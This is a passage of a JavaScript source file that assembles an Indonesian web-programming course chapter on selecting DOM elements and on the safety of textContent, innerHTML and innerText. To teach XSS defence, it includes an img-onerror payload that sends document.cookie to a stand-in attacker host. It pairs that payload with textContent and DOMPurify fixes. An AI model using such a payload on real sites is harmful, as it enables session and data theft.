        'Selisih 3 melawan 2 itu adalah seluruh perbedaannya. `getElementsByClassName` dan `getElementsByTagName` mengembalikan `HTMLCollection` yang terhubung ke dokumen, sehingga isinya selalu mencerminkan keadaan sekarang. `querySelectorAll` mengembalikan `NodeList` statis, yaitu potret pada saat pemanggilan. Keduanya benar untuk keperluan yang berbeda, dan memakai yang salah menghasilkan bug yang tidak berbunyi.',
      ),
      code(
        'js',
        `
        // Koleksi hidup + loop maju = elemen terlewat.
        const hidup = wadah.getElementsByClassName('baris');
        for (let i = 0; i < hidup.length; i += 1) {
          hidup[i].remove();          // menghapus MENGUBAH panjang koleksinya
        }
        console.log(hidup.length);    // bukan 0, melainkan sekitar separuhnya

        // Perbaikan: bekukan dulu menjadi array.
        for (const el of [...wadah.getElementsByClassName('baris')]) {
          el.remove();
        }
        `,
        { caption: 'Menghapus sambil menelusuri koleksi hidup selalu melewatkan elemen.' },
      ),
      p(
        'Alasannya bisa ditelusuri langkah demi langkah. Pada `i` bernilai 0, elemen pertama dihapus dan seluruh sisanya bergeser satu posisi ke kiri sekaligus `length` berkurang satu. Pada putaran berikutnya `i` menjadi 1, sehingga yang tadinya berada di posisi 1 dan sekarang di posisi 0 tidak pernah tersentuh. Setengah elemen terlewat, dan tidak ada satu pun error.',
      ),
      code(
        'js',
        `
        // Pemilihan yang tahan terhadap perubahan tampilan.
        const wadah = document.getElementById('daftar-pesanan');

        // BURUK: terikat pada struktur dan kelas gaya
        wadah.querySelectorAll('div > div > button.bg-red-500');

        // BAIK: terikat pada MAKSUD, lewat atribut data
        wadah.querySelectorAll('[data-aksi="batalkan"]');

        // Cari yang terdekat ke atas, berguna di dalam penangan klik.
        const baris = tombol.closest('[data-pesanan-id]');
        const id = baris?.dataset.pesananId;
        `,
        { filename: 'src/admin/pesanan.js' },
      ),
      p(
        'Pemilih pertama akan rusak begitu ada yang mengganti warna tombol dari merah menjadi jingga, atau menambah satu pembungkus `div` untuk keperluan tata letak. Keduanya perubahan tampilan murni yang seharusnya tidak menyentuh logika sama sekali. Pemilih kedua terikat pada atribut yang kamu buat khusus untuk itu, sehingga ia hanya berubah kalau maksudnya memang berubah.',
      ),
      p(
        'Method `closest` menelusuri **ke atas** dari elemen yang diberikan sampai menemukan yang cocok, termasuk elemen itu sendiri. Ia adalah pasangan alami dari pemilihan berbasis atribut data, sebab di dalam penangan klik kamu memegang tombolnya dan yang kamu butuhkan adalah barisnya. Tanpa `closest`, orang biasanya menulis `tombol.parentElement.parentElement`, dan rantai itu rusak setiap kali ada satu pembungkus ditambahkan.',
      ),
      callout(
        'tip',
        'Satu awalan atribut untuk hal yang dipakai JavaScript',
        'Banyak tim memakai awalan seperti `data-js-` atau `data-testid` untuk menandai elemen yang disentuh kode, terpisah dari kelas yang dipakai gaya. Dengan begitu siapa pun yang mengubah tampilan tahu bahwa kelas boleh diganti bebas, sedangkan atribut bertanda itu tidak boleh disentuh tanpa memeriksa pemakainya.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Kegagalan pemilihan terbagi dua, yaitu yang melempar dan yang menghasilkan kekosongan tanpa suara. Yang kedua jauh lebih sering dan lebih lama ditelusuri.',
      ),
      code(
        'text',
        `
        document.querySelectorAll('.baris').classList.add('aktif');
                                            ^

        TypeError: Cannot read properties of undefined (reading 'add')
        `,
        { caption: 'Method elemen dipanggil pada daftar elemen.' },
      ),
      p(
        '`querySelectorAll` mengembalikan daftar, dan daftar tidak punya `classList`. Kesalahan ini sangat sering terjadi karena bentuk tunggal dan jamaknya hanya berbeda tiga huruf. Perhatikan pesannya menyebut `undefined` dan bukan `null`, dan itu petunjuknya, sebab `daftar.classList` memang tidak ada sehingga hasilnya `undefined`. Perbaikannya menelusuri daftarnya dengan `forEach` atau `for...of`, atau memakai `querySelector` tunggal kalau memang hanya satu yang dimaksud.',
      ),
      code(
        'text',
        `
        document.querySelector('#1abc');

        SyntaxError: Failed to execute 'querySelector' on 'Document':
        '#1abc' is not a valid selector.
        `,
        { caption: 'Pemilih tidak sah menurut aturan CSS.' },
      ),
      p(
        'Selain id yang diawali angka, penyebab lain yang sering adalah nilai atribut yang mengandung tanda kutip atau spasi tanpa dibungkus, misalnya `[data-nama=Sari Dewi]`. Bungkus nilainya dengan tanda kutip menjadi `[data-nama="Sari Dewi"]`. Untuk nilai yang datang dari data dan bisa berisi apa saja, pakai `CSS.escape(nilai)` supaya karakter khususnya tidak merusak pemilihnya.',
      ),
      code(
        'text',
        `
        const el = document.querySelector('.tombol-simpan');
        el.disabled = true;

        // Halaman punya TIGA tombol simpan, dan hanya yang pertama yang mati.
        `,
        { caption: 'Tidak ada error, dan hanya satu dari tiga elemen yang terkena.' },
      ),
      p(
        '`querySelector` mengembalikan **yang pertama cocok** dan berhenti di situ. Kalau kamu bermaksud mengenai semuanya, yang dibutuhkan `querySelectorAll` dengan loop. Gejalanya khas, yaitu fiturnya bekerja untuk elemen pertama dan diam untuk sisanya, dan itu sering disalahartikan sebagai masalah pada elemen kedua dan ketiga.',
      ),
      code(
        'text',
        `
        const baris = wadah.querySelectorAll('.baris');
        muatLagi();                      // menambah 20 baris ke wadah
        console.log(baris.length);       // tetap 20, bukan 40
        `,
        { caption: 'Daftar statis tidak ikut bertambah setelah DOM berubah.' },
      ),
      p(
        'Ini kebalikan dari jebakan koleksi hidup, dan keduanya sama-sama tidak melempar apa pun. Daftar statis adalah potret, jadi elemen yang lahir setelah pemanggilan tidak akan pernah masuk. Kalau kamu menyimpan hasil `querySelectorAll` lalu memakainya setelah DOM berubah, ambil ulang. Untuk daftar yang isinya sering berubah, pendekatan yang lebih baik adalah tidak menyimpan daftarnya sama sekali dan memakai delegasi peristiwa dari Sub-bab 4.8.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            "`Cannot read properties of undefined (reading 'add')`",
            'Method elemen dipanggil pada hasil `querySelectorAll`',
            'Telusuri daftarnya, atau pakai `querySelector` tunggal',
          ],
          [
            '`is not a valid selector`',
            'Sintaks pemilih tidak sah',
            'Bungkus nilai atribut dengan kutip, dan pakai `CSS.escape` untuk nilai dinamis',
          ],
          [
            'Hanya elemen pertama yang terpengaruh',
            '`querySelector` berhenti pada yang pertama cocok',
            'Ganti ke `querySelectorAll` lalu telusuri',
          ],
          [
            'Elemen baru tidak ikut terpengaruh',
            'Daftar statis diambil sebelum elemennya ada',
            'Ambil ulang, atau pakai delegasi peristiwa',
          ],
          [
            'Separuh elemen terlewat saat dihapus dalam loop',
            'Koleksi hidup berubah panjang saat ditelusuri',
            'Bekukan dulu menjadi array dengan tiga titik',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Pemilihan elemen terlihat sebagai bagian paling sederhana dari DOM, dan justru di situlah keputusan yang menentukan seberapa mudah kode itu dirawat setahun kemudian.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memilih elemen lewat kelas yang dipakai untuk gaya',
            'Kelasnya sudah ada, jadi tidak perlu menambah apa-apa',
            'Mengganti gaya menjadi mengubah perilaku. Orang yang mengganti warna tombol tidak punya cara tahu ada kode yang bergantung padanya',
          ],
          [
            'Memakai rantai `parentElement.parentElement`',
            'Strukturnya kan sudah pasti',
            'Satu pembungkus tambahan untuk tata letak langsung merusaknya. Pakai `closest` dengan atribut yang menyatakan maksud',
          ],
          [
            'Memanggil `querySelector` berulang kali di dalam loop',
            'Tiap baris kan perlu dicari elemennya',
            'Tiap pemanggilan menelusuri dokumen dari awal. Cari sekali di luar loop, atau cari dari dalam barisnya bukan dari `document`',
          ],
          [
            'Memakai `getElementsByClassName` karena namanya lebih jelas',
            'Namanya menyebut persis yang dicari',
            'Ia menghasilkan koleksi hidup yang berubah saat DOM berubah, dan itu jarang yang kamu maksud. `querySelectorAll` lebih mudah diprediksi',
          ],
          [
            'Mencari dari `document` padahal sudah punya wadahnya',
            'Sama saja hasilnya',
            'Mencari dari `document` bisa menemukan elemen dari bagian halaman lain yang kebetulan kelasnya sama. Batasi pencarian ke wadah yang relevan',
          ],
          [
            'Menyalin pemilih panjang dari menu Copy selector di DevTools',
            'DevTools yang membuatnya, jadi pasti benar',
            'Pemilih itu terikat pada posisi persis dan berisi rantai `nth-child` yang rusak begitu urutannya berubah. Pakai sebagai titik awal, lalu sederhanakan',
          ],
        ],
      ),
      p(
        'Baris ketiga punya dampak yang bisa diukur pada tabel besar. Memanggil `document.querySelector` di dalam loop untuk seribu baris berarti seribu penelusuran dokumen penuh. Bentuk yang benar adalah mencari wadahnya sekali, lalu untuk tiap baris mencari dari dalam barisnya sendiri dengan `baris.querySelector(...)`. Cakupan pencariannya menjadi jauh lebih kecil, dan maksudnya juga lebih jelas terbaca.',
      ),
      callout(
        'warning',
        'Elemen berid otomatis menjadi variabel global, dan itu bukan fitur yang layak dipakai',
        'Peramban membuat variabel global untuk tiap elemen yang punya `id`, sehingga `<div id="wadah">` bisa diakses langsung sebagai `wadah` tanpa `getElementById`. Jangan memakainya. Ia bisa bentrok dengan variabelmu sendiri, tidak terlihat oleh pembaca kode, dan hilang begitu elemennya dibuat dari JavaScript. Tulis pengambilannya secara eksplisit.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        '`querySelector` untuk satu, `querySelectorAll` untuk banyak — keduanya menerima selector CSS.',
        '`querySelector` mengembalikan `null` diam-diam; periksa untuk elemen yang wajib ada.',
        'Seleksi di dalam elemen induk, bukan seluruh dokumen.',
        'NodeList punya `forEach` tapi bukan array — sebar dengan `[...]` untuk `map`/`filter`.',
        '`getElementsBy*` menghasilkan koleksi hidup; salin dulu sebelum memodifikasi sambil me-loop.',
      ),
      references(
        {
          label: 'Document.querySelector()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector',
          source: 'MDN',
          note: 'Menegaskan bahwa hasilnya `null` ketika tidak ada yang cocok — bukan error.',
        },
        {
          label: 'Document.querySelectorAll()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelectorAll',
          source: 'MDN',
          note: 'Termasuk penegasan bahwa `NodeList` yang dikembalikannya bersifat statis.',
        },
        {
          label: 'NodeList',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/NodeList',
          source: 'MDN',
          note: 'Perbedaan NodeList hidup dan statis, beserta daftar method yang benar-benar dimilikinya.',
        },
        {
          label: 'HTMLCollection',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection',
          source: 'MDN',
          note: 'Koleksi hidup dari `getElementsBy*` — dasar jebakan loop di sub-bab ini.',
        },
        {
          label: 'CSS selectors',
          href: 'https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_selectors',
          source: 'MDN',
          note: 'Seluruh tata bahasa selector yang bisa dipakai — sama persis dengan yang berlaku di CSS.',
        },
      ),
    ],
  ),

  written(
    'mengubah-konten',
    '`textContent` vs `innerHTML` vs `innerText`',
    24,
    'Tiga cara mengisi konten — dan satu di antaranya adalah celah keamanan.',
    [
      terms(
        {
          term: 'textContent',
          meaning:
            'Property yang membaca atau mengisi isi sebuah elemen sebagai **teks apa adanya**. Kalau kamu mengisinya dengan `"<b>halo</b>"`, yang muncul di layar adalah tulisan `<b>halo</b>` itu sendiri, bukan huruf tebal. Justru sifat "tidak menafsirkan" inilah yang membuatnya **aman** — dan ia juga yang paling murah dari ketiganya.',
        },
        {
          term: 'innerHTML',
          meaning:
            'Property yang mengisi elemen dengan **mem-parse isinya sebagai HTML sungguhan**, sehingga tag di dalamnya benar-benar menjadi elemen. Ini yang membuatnya berguna sekaligus berbahaya: begitu isinya berasal dari pengguna, kamu membuka celah XSS. Aturan yang dipakai project ini: jangan pernah dipakai untuk data yang tidak kamu tulis sendiri.',
        },
        {
          term: 'innerText',
          meaning:
            'Mirip `textContent` tapi **memperhitungkan CSS**: teks pada elemen yang disembunyikan dengan `display: none` tidak ikut terbaca, dan spasi dirapikan mengikuti tampilan. Konsekuensinya ia jauh lebih mahal, karena browser harus menghitung tata letak dulu sebelum bisa menjawab.',
        },
        {
          term: 'XSS',
          meaning:
            'Singkatan *Cross-Site Scripting*. Celah keamanan ketika data dari pengguna dirender sebagai HTML atau skrip, sehingga penyerang bisa **menjalankan kodenya sendiri di browser korban** — mencuri sesi, mengubah tampilan, atau mengirim data keluar. Ini bukan ancaman teoretis; ia konsisten masuk daftar kerentanan paling umum versi OWASP.',
        },
        {
          term: 'sanitasi',
          meaning:
            'Dari *sanitize*, artinya **membersihkan**. Membuang tag dan atribut berbahaya dari HTML sebelum ia dirender. Perlu ditegaskan: **jangan pernah menulis penyaring sendiri** — daftar hal berbahaya jauh lebih panjang dan lebih kreatif daripada dugaan siapa pun. Pakai library yang memang dirawat untuk itu.',
        },
        {
          term: 'payload',
          meaning:
            'Dibaca "peilod", terjemahan Indonesianya **muatan**. Dalam konteks keamanan, potongan data yang sengaja disusun penyerang untuk memicu perilaku yang tidak diinginkan — misalnya `<img src=x onerror=alert(1)>` yang menjalankan kode meski tidak ada tag `<script>` sama sekali.',
        },
        {
          term: 'escape',
          meaning:
            'Artinya **melarikan** atau menetralkan. Mengubah karakter bermakna khusus menjadi bentuk amannya, misalnya `<` menjadi `&lt;`. `textContent` melakukannya secara otomatis untukmu, dan itulah mekanisme sebenarnya di balik keamanannya.',
        },
        {
          term: 'reflow',
          meaning:
            'Perhitungan ulang tata letak halaman oleh browser. Disebut di sini karena `innerText` **memaksa reflow** untuk bisa menjawab — itulah sumber biayanya. Dibahas tuntas di Sub-bab 4.12.',
        },
      ),

      h2('Perbedaannya'),
      table(
        ['Property', 'Menafsirkan HTML?', 'Memperhitungkan CSS?', 'Biaya'],
        [
          ['`textContent`', 'Tidak — teks apa adanya', 'Tidak', 'Murah'],
          ['`innerHTML`', '**Ya** — mem-parse jadi elemen', 'Tidak', 'Mahal'],
          ['`innerText`', 'Tidak', '**Ya** — memicu perhitungan layout', 'Paling mahal'],
        ],
      ),
      code(
        'js',
        `
        el.textContent = '<b>tebal</b>';
        // Menampilkan literal: <b>tebal</b>

        el.innerHTML = '<b>tebal</b>';
        // Menampilkan: tebal (huruf tebal sungguhan)
        `,
      ),
      p(
        'String yang ditugaskan **sama persis** di kedua baris, tapi hasil di layar berbeda total, dan itu satu-satunya hal yang perlu kamu pahami dari sub-bab ini. `textContent` memperlakukan apa pun yang kamu berikan sebagai **teks murni**, sehingga tanda `<` ditampilkan sebagai karakter `<` dan bukan sebagai awal tag. `innerHTML` memperlakukannya sebagai **kode HTML** yang harus diurai menjadi elemen sungguhan. Perbedaan itu terasa seperti soal tampilan, padahal ia soal keamanan. Begitu kamu memilih `innerHTML`, kamu memberi izin kepada isi string itu untuk **menjadi elemen apa pun**, termasuk elemen yang menjalankan kode. Bagian berikutnya menunjukkan persis apa artinya bagi teks yang datang dari orang lain.',
      ),

      h2('Kenapa `innerHTML` berbahaya'),
      code(
        'js',
        `
        // Komentar dari pengguna:
        const komentar = '<img src=x onerror="fetch(\\'https://penyerang/?c=\\'+document.cookie)">';

        el.innerHTML = komentar;
        // Gambar gagal dimuat -> onerror berjalan -> cookie sesi terkirim ke penyerang.
        // Ini XSS, dan tidak butuh tag <script> sama sekali.
        `,
      ),
      p(
        'Bedah serangan ini pelan-pelan, karena kecerdikannya justru pada apa yang **tidak** ada di dalamnya. Tidak ada tag `<script>`, jadi penyaringan naif yang hanya memblokir kata "script" tidak menangkapnya sama sekali. Yang dikirim hanyalah sebuah `<img>` dengan `src=x`, alamat yang sudah pasti gagal dimuat. Kegagalan itulah yang disengaja, karena gambar yang gagal memicu `onerror`, dan isi `onerror` adalah JavaScript yang **dijalankan browser dengan hak penuh halamanmu**, termasuk hak membaca `document.cookie` dan mengirimkannya ke server penyerang. Pelajaran umumnya, bahaya `innerHTML` bukan terletak pada tag tertentu yang bisa didaftar hitam, melainkan pada puluhan atribut penangan peristiwa yang tersebar di seluruh spesifikasi HTML. Itu sebabnya jawabannya bukan "saring yang berbahaya", melainkan "jangan pakai `innerHTML` untuk data pengguna".',
      ),
      callout(
        'danger',
        'Aturan yang tidak bisa ditawar',
        '**Data yang berasal dari pengguna tidak pernah boleh masuk ke `innerHTML`.** Termasuk nama, komentar, hasil pencarian, pesan error, dan apa pun dari API — karena API itu sendiri menerima input dari seseorang. Pakai `textContent`.',
      ),
      code(
        'js',
        `
        // AMAN — dirender sebagai teks, apa pun isinya
        el.textContent = komentar;

        // Kalau HTML memang WAJIB (misalnya konten dari editor):
        // sanitasi dulu dengan library yang teruji, jangan menyaring sendiri.
        import DOMPurify from 'dompurify';
        el.innerHTML = DOMPurify.sanitize(htmlDariEditor);
        `,
      ),
      p(
        'Baris pertama adalah jawaban untuk hampir semua kasus. `textContent` aman **apa pun isi variabelnya**, karena ia tidak pernah menafsirkan isinya sebagai HTML. Payload penyerang yang sama tadi akan tampil apa adanya sebagai teks, jelek tapi tidak berbahaya. Bagian bawah menangani kasus yang jarang tapi nyata, ketika konten dari editor teks kaya memang **harus** berupa HTML karena itulah bentuk datanya. Untuk itu jalannya adalah sanitasi, yaitu membuang tag dan atribut berbahaya sebelum menyerahkannya ke `innerHTML`. Perhatikan peringatan di komentar, yang berbunyi **jangan menyaring sendiri**. Daftar hitam buatan sendiri selalu tertinggal dari kreativitas penyerang, dan library seperti DOMPurify dipelihara justru untuk mengejar celah-celah baru yang terus ditemukan.',
      ),

      h2('`innerHTML` juga merusak yang sudah ada'),
      code(
        'js',
        `
        // Menghancurkan seluruh isi lalu membangun ulang:
        //   - event listener pada elemen lama hilang
        //   - fokus keyboard hilang
        //   - nilai input yang sedang diketik hilang
        //   - posisi scroll bisa lompat
        wadah.innerHTML += '<li>baru</li>';   // JANGAN — mem-parse ulang SEMUANYA

        // Menambahkan tanpa merusak yang lain:
        wadah.append(buatItem('baru'));
        `,
      ),
      p(
        'Empat kerusakan yang disebut di komentar bukan kebetulan, karena semuanya berasal dari satu akar yang sama. `innerHTML += ...` tidak menambahkan elemen baru ke pohon yang sudah ada, melainkan **membongkar seluruh isi wadah menjadi teks HTML, lalu mem-parse ulang semuanya dari nol**. Elemen-elemen lama benar-benar dihancurkan dan digantikan elemen baru yang terlihat identik tapi sebenarnya objek yang sama sekali berbeda. Itulah sebabnya event listener yang terpasang di elemen lama, yang sudah tidak ada lagi, tidak ikut pindah ke elemen barunya. `wadah.append(...)` tidak punya masalah ini karena ia benar-benar **menambahkan** node baru ke pohon yang ada, tanpa pernah menyentuh node-node lama sama sekali.',
      ),

      h2('Kapan `innerText` berbeda'),
      code(
        'js',
        `
        // <p>Terlihat <span style="display:none">tersembunyi</span></p>
        p.textContent;   // 'Terlihat tersembunyi'
        p.innerText;     // 'Terlihat'   — menghormati CSS

        // innerText memaksa browser menghitung layout dulu.
        // Di dalam loop, ini penyebab lambat yang sering tidak disadari.
        `,
      ),
      p(
        'Selisih satu kata, yaitu `tersembunyi`, berasal dari perbedaan sudut pandang keduanya. `textContent` membaca **pohon DOM**, dan `<span>` yang di-`display:none` tetap ada di sana beserta teksnya. `innerText` membaca **apa yang benar-benar terlihat**, jadi ia menghormati CSS dan melewatkan bagian yang tersembunyi. Perbedaan itu kadang justru yang kamu inginkan, misalnya saat menyalin teks yang tampil ke clipboard. Tapi ada harganya, dan komentar terakhir menyebutnya. Untuk tahu apa yang terlihat, browser harus **menghitung tata letak halaman lebih dulu**. Membaca `innerText` sekali tidak terasa, tetapi membacanya di dalam loop untuk seratus elemen memaksa seratus perhitungan tata letak. Itu salah satu penyebab lambat yang paling jarang dicurigai karena kodenya terlihat sederhana.',
      ),

      h2('Menyisipkan HTML dengan aman: `insertAdjacentHTML`'),
      code(
        'js',
        `
        // Menyisipkan tanpa mem-parse ulang isi yang sudah ada
        wadah.insertAdjacentHTML('beforeend', '<li>baru</li>');

        // Posisi: 'beforebegin' | 'afterbegin' | 'beforeend' | 'afterend'
        // TETAP tidak boleh dipakai untuk data pengguna — ia tetap mem-parse HTML.
        `,
      ),
      p(
        '`insertAdjacentHTML` menutup satu dari dua masalah `innerHTML +=`, bukan keduanya, dan membedakannya penting supaya kamu tidak salah menyimpulkan. Yang **ditutup** adalah bahwa ia benar-benar menyisipkan, tanpa membongkar dan mem-parse ulang isi yang sudah ada, sehingga listener, fokus, dan nilai input yang sedang diketik selamat. Yang **tidak ditutup** adalah bahwa ia tetap mem-parse string sebagai HTML, jadi payload `<img onerror=...>` dari bagian sebelumnya tetap berjalan persis sama. Empat nilai posisi di komentar menentukan titik sisipnya relatif terhadap elemen. `beforebegin` dan `afterend` menaruhnya **di luar** elemen, yaitu sebelum dan sesudahnya, sedangkan `afterbegin` dan `beforeend` menaruhnya **di dalam** sebagai anak pertama atau anak terakhir. `beforeend` adalah yang paling sering dipakai, karena ia setara dengan "tambahkan di akhir daftar".',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman detail produk menampilkan ulasan pembeli. Isinya diketik pembeli sendiri, jadi bisa berisi apa saja. Kamu menampilkannya dengan `innerHTML` supaya baris barunya bisa diubah menjadi tag, dan itu bekerja rapi. Beberapa minggu kemudian ada pembeli yang mengirim ulasan berisi tag gambar dengan alamat yang sengaja dibuat salah, dan sejak itu setiap pengunjung halaman produk itu menjalankan kode milik orang tersebut.',
      ),
      p('Ini bukan skenario karangan. Berikut buktinya, dijalankan di Chromium sungguhan.'),
      code(
        'js',
        `
        const kotak = document.createElement('div');
        kotak.innerHTML = '<img src=x onerror="console.log(\\'XSS JALAN\\')">';
        document.body.appendChild(kotak);

        // Keluaran console: XSS JALAN
        `,
        {
          caption:
            'Tag `script` memang tidak dijalankan oleh `innerHTML`, tapi `onerror` dijalankan.',
        },
      ),
      p(
        'Banyak orang mengira `innerHTML` aman karena tag `<script>` di dalamnya tidak dijalankan, dan itu memang benar. Yang tidak dijalankan hanya tag `script`, sedangkan **atribut penangan peristiwa tetap aktif**. Alamat gambar `x` sengaja dibuat tidak ada supaya gagal dimuat, dan kegagalan itulah yang memicu `onerror`. Tidak ada satu pun tag `script` di sana, dan kodenya tetap berjalan.',
      ),
      code(
        'js',
        `
        // BAHAYA: teks dari pengguna diperlakukan sebagai HTML
        kotak.innerHTML = \`<p>\${ulasan.isi}</p>\`;

        // AMAN: teks tetap menjadi teks, apa pun isinya
        const paragraf = document.createElement('p');
        paragraf.textContent = ulasan.isi;
        kotak.append(paragraf);
        `,
        { caption: 'Perbedaan satu properti yang menentukan.' },
      ),
      p(
        '`textContent` tidak pernah mengurai isinya sebagai HTML. Kalau pembeli mengetik `<img src=x onerror=...>`, yang muncul di layar adalah teks itu apa adanya beserta tanda kurung sudutnya, dan tidak ada satu pun yang dijalankan. Inilah alasan aturan project ini menyebut pemakaian `innerHTML` dengan data pengguna sebagai cacat, bukan sebagai pilihan gaya.',
      ),
      code(
        'js',
        `
        // Kasus nyata yang lebih lengkap: satu kartu ulasan.
        function buatKartuUlasan(ulasan) {
          const kartu = document.createElement('article');
          kartu.className = 'kartu-ulasan';
          kartu.dataset.ulasanId = ulasan.id;

          const nama = document.createElement('strong');
          nama.textContent = ulasan.nama;              // dari pengguna, pakai textContent

          const bintang = document.createElement('span');
          bintang.setAttribute('aria-label', \`\${ulasan.nilai} dari 5 bintang\`);
          bintang.textContent = '★'.repeat(ulasan.nilai) + '☆'.repeat(5 - ulasan.nilai);

          const isi = document.createElement('p');
          isi.textContent = ulasan.isi;                // dari pengguna, pakai textContent

          const waktu = document.createElement('time');
          waktu.dateTime = ulasan.padaIso;             // kita yang mengendalikan, aman
          waktu.textContent = new Intl.DateTimeFormat('id-ID', { dateStyle: 'long' })
            .format(new Date(ulasan.padaIso));

          kartu.append(nama, bintang, isi, waktu);     // append menerima banyak sekaligus
          return kartu;
        }
        `,
        { filename: 'src/ulasan/kartu.js' },
      ),
      p(
        'Fungsi ini memisahkan dua jenis nilai dengan tegas. Nama dan isi ulasan datang dari pengguna, jadi keduanya masuk lewat `textContent`. Sebaliknya `dateTime` dan `aria-label` dibentuk dari data yang kamu kendalikan, sehingga aman ditulis sebagai atribut. Kebiasaan memisahkan keduanya sejak awal jauh lebih murah daripada menyisir ulang seluruh berkas nanti.',
      ),
      p(
        'Method `append` di baris terakhir berbeda dari `appendChild` dalam dua hal yang keduanya berguna. Ia menerima **beberapa** node sekaligus dalam satu panggilan, dan ia juga menerima teks biasa yang otomatis diubah menjadi node teks yang aman. `appendChild` hanya menerima satu node dan menolak teks. Untuk kode baru, `append` hampir selalu pilihan yang lebih enak.',
      ),
      callout(
        'danger',
        'Kalau HTML memang harus dirender, bersihkan dulu dengan pustaka yang teruji',
        'Sebagian kasus memang menuntut HTML sungguhan, misalnya isi artikel dari editor teks kaya. Untuk itu, jangan menulis penyaring sendiri. Daftar tag berbahaya jauh lebih panjang daripada dugaan, dan penyerang punya banyak cara memutarnya. Pakai pustaka pembersih yang sudah teruji, dan jalankan pembersihannya di server bukan hanya di peramban.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Bagian ini punya sifat khas, yaitu kegagalan yang paling berbahaya justru tidak menghasilkan error sama sekali. Dua pesan pertama diambil dari Chromium sungguhan, dan dua sisanya adalah gejala senyap.',
      ),
      code(
        'text',
        `
        document.getElementById('nihil').textContent = 'x';
                                         ^

        TypeError: Cannot set properties of null (setting 'textContent')
        `,
        { caption: 'Menulis ke elemen yang tidak ditemukan.' },
      ),
      p(
        'Sudah dibahas di Sub-bab 4.1 dan muncul lagi di sini karena bentuk menulisnya paling sering ditemui di sub-bab ini. Yang perlu ditambahkan, kalau elemennya memang boleh tidak ada, tulis penjaganya secara eksplisit dengan `if (el)` atau `el?.` alih-alih membiarkannya melempar. Yang harus dihindari adalah memasang `?.` di mana-mana tanpa memikirkan apakah ketiadaan elemen itu memang wajar.',
      ),
      code(
        'text',
        `
        const kotak = document.createElement('div');
        kotak.innerHTML = '<img src=x onerror="console.log(\\'XSS JALAN\\')">';
        document.body.appendChild(kotak);

        XSS JALAN
        `,
        { caption: 'Tidak ada error. Kode milik orang lain berjalan di halamanmu.' },
      ),
      p(
        'Inilah kegagalan paling mahal dari seluruh sub-bab ini, dan tidak ada satu pun tanda di console selain keluaran dari penyerangnya sendiri. Kode yang berjalan lewat celah ini punya akses penuh ke halaman, termasuk membaca isi formulir, membaca penyimpanan peramban, dan mengirim apa pun ke server milik penyerang. Karena tidak ada error, satu-satunya cara menemukannya adalah tinjauan kode dan alat pemindai.',
      ),
      code(
        'text',
        `
        el.innerHTML = '';
        for (const item of daftar) {
          el.innerHTML += \`<li>\${item.judul}</li>\`;
        }

        // Bekerja, tapi seluruh isi el dibongkar dan dibangun ulang tiap putaran.
        `,
        { caption: 'Tidak ada error, dan seluruh penangan peristiwa di dalamnya hilang.' },
      ),
      p(
        'Bentuk `innerHTML +=` membaca seluruh isi menjadi teks, menggabungnya, lalu mengurai ulang semuanya dari nol. Akibat pertamanya lambat, dan akibat kedua yang lebih merusak adalah **seluruh elemen di dalamnya dibuat ulang**. Penangan peristiwa yang dipasang ke elemen lama hilang, fokus keyboard hilang, dan isi kotak input yang sedang diketik pengguna ikut lenyap. Kumpulkan dulu ke array lalu pasang sekali, atau lebih baik pakai `append` dengan node sungguhan.',
      ),
      code(
        'text',
        `
        el.textContent = '<b>tebal</b>';

        // Yang muncul di layar: <b>tebal</b>
        // Bukan teks tebal.
        `,
        { caption: 'Kebalikannya, HTML yang memang dimaksudkan justru tampil sebagai teks.' },
      ),
      p(
        'Ini kebingungan arah sebaliknya, dan biasanya muncul setelah seseorang mengganti seluruh `innerHTML` menjadi `textContent` untuk alasan keamanan. Kalau sepotong HTML memang kamu tulis sendiri dan tidak berasal dari pengguna, `innerHTML` sah dipakai. Aturannya bukan jangan pernah pakai `innerHTML`, melainkan jangan pernah memasukkan data pengguna ke dalamnya.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            "`Cannot set properties of null (setting 'textContent')`",
            'Elemennya tidak ditemukan',
            'Periksa keberadaannya, atau perbaiki waktu dan pemilihnya',
          ],
          [
            'Kode asing berjalan tanpa satu pun error',
            'Data pengguna masuk lewat `innerHTML`',
            'Pakai `textContent`, atau bersihkan dengan pustaka teruji bila HTML memang perlu',
          ],
          [
            'Penangan peristiwa hilang setelah daftar diperbarui',
            '`innerHTML` membangun ulang seluruh isi',
            'Bangun node dengan `createElement` dan `append`, atau pakai delegasi peristiwa',
          ],
          [
            'Tag muncul sebagai teks di layar',
            '`textContent` dipakai untuk HTML yang memang dimaksudkan',
            'Pakai `innerHTML` untuk markup yang kamu tulis sendiri',
          ],
          [
            'Daftar panjang terasa lambat saat diperbarui',
            '`innerHTML +=` di dalam loop',
            'Kumpulkan dulu, lalu pasang sekali',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Mengubah isi elemen terlihat sebagai operasi paling sederhana di DOM, dan ia sekaligus tempat celah keamanan paling umum di frontend lahir.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Memakai `innerHTML` untuk semua pengisian isi',
            'Ia paling fleksibel dan paling pendek',
            'Begitu ada satu nilai dari pengguna yang masuk, halamanmu bisa menjalankan kode orang lain. Pakai `textContent` sebagai bawaan',
          ],
          [
            'Mengira `innerHTML` aman karena tag `script` tidak jalan',
            'Itu memang benar',
            'Atribut seperti `onerror` dan `onload` tetap dijalankan, dan itu sudah cukup untuk seluruh serangan',
          ],
          [
            'Menyaring sendiri dengan menghapus kata `script`',
            'Itu kan yang berbahaya',
            'Daftar cara memutar penyaring sederhana sangat panjang, termasuk atribut peristiwa, `javascript:` pada href, dan SVG. Penyaring buatan sendiri hampir selalu bocor',
          ],
